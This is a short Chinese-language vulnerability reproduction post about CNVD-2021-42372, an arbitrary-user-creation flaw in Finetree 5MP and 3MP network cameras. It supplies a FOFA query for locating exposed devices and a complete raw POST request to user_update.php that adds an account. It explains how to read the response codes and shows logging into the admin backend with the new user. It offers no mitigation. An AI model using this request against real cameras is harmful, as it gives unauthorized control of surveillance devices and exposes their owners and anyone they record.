#  Finetree-5MP-摄像机-user_pop.php-任意用户添加漏洞-CNVD-2021-42372   
原创 骇客安全  骇客安全   2025-03-03 16:00  
  
## 漏洞影响  
```
Finetree 5MP
Finetree 3MP
```  
  
## FOFA  
```
app="Finetree-5MP-Network-Camera"
```  
## 漏洞复现  
  
登录页面  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991M6VqiaB5oWkwqwhqkaZoNuW0Gh9OjNY3AqdUnLddg3aV6A4iav1eAw6NvA5TJTibfv1JniceosFgQSEw/640?wx_fmt=png&from=appmsg "null")  
  
存在漏洞的文件 user_pop.php  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991M6VqiaB5oWkwqwhqkaZoNuWT6CrUc1RvO9vA5ndgH1x3SokRnAAgIYiawRsH08JNCT1ic5oS8modXEA/640?wx_fmt=png&from=appmsg "null")  
```
POST /quicksetup/user_update.php HTTP/1.1
Host: 
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Content-Length: 58
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=fn4qnpv5c8a2jgvf53vs1gufm6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

method=add&user=admin1234&pwd=admin1234&group=2&ptz_enable=0
```  
  
可以Burpsuite发送POST请求  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991M6VqiaB5oWkwqwhqkaZoNuWicgZaGArloptzqSI5GZh83f0t2qxXUmDWH668TCLOWWuic0O1iaFCLrrQ/640?wx_fmt=png&from=appmsg "null")  
  
或者HackBar发送POST请求，返回200即为添加成功，返回804则为用户重复  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991M6VqiaB5oWkwqwhqkaZoNuWfJ8cGv2fEUNvVXoEUF8JPlP9d2qIEjmzqMLBiamphlVVricphMZYuzicA/640?wx_fmt=png&from=appmsg "null")  
  
利用添加的账户可以登录后台  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IePibcXn991M6VqiaB5oWkwqwhqkaZoNuWu8lShU0bsZuticqvV2JAnmjURSsUkelBuUBMtwdia2vgkLEMicCdliac6w/640?wx_fmt=png&from=appmsg "null")  
  
